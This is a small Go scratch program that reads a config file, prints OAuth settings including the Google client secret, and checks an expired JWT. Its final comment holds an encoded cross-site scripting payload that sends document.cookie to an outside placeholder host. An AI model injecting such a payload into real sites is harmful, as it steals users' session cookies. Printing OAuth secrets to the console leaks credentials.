package main

import (
	"fmt"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"okapi.com/config"
)

func main() {
	cfg := config.ReadConfigFile("config/base.yml")

	// fmt.Println(cfg.APIConfig.Port)
	// fmt.Println(cfg.RepositoryConfig.Type)
	// fmt.Println(cfg.RepositoryConfig.URL)

	fmt.Println(cfg.Oauth.Google.ClientID)
	fmt.Println(cfg.Oauth.Google.ClientSecret)
	//fmt.Println(cfg.Oauth2Config.Google.Endpoint)
	fmt.Println(cfg.Oauth.Google.RedirectURL)
	fmt.Println(cfg.Oauth.Google.Scopes)
	fmt.Println(time.Now().Unix())

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.RegisteredClaims{
		ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Second * -10)),
	})
	fmt.Println(token.Valid)
	//jwt.NewNumericDate()
	//"http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;"
}
